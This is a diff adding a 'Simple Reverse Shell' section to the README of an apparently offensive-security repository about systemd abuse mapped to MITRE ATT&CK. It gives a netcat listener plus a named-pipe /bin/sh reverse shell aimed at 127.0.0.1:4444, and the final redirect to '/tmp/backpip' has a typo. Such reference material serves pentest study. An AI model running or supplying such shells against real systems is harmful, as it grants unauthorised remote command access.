@@ -5,6 +5,18 @@ A simple repository for tracking the many ways to turn [systemd](https://www.fre
 I'll be using the [MITRE ATT&CK](https://attack.mitre.org/) framework to guide techniques here,
  and I'll explain the similarities and differences between systemd on Linux and the equivalent technique on Windows, if one exists.
 
+## The Goods
+
+#### Simple Reverse Shell
+```sh
+# Stand up netcat listener
+$ nc -nlvp 4444
+# https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/
+$ mknod /tmp/backpipe p
+# pipe shell's STDIN and STDOUT back to each other via backpipe
+$ /bin/sh 0</tmp/backpipe | /bin/nc 127.0.0.1 4444 1>/tmp/backpip
+```
+
 ## Basic Components
 
 * [systemctl](https://www.freedesktop.org/software/systemd/man/systemctl.html)
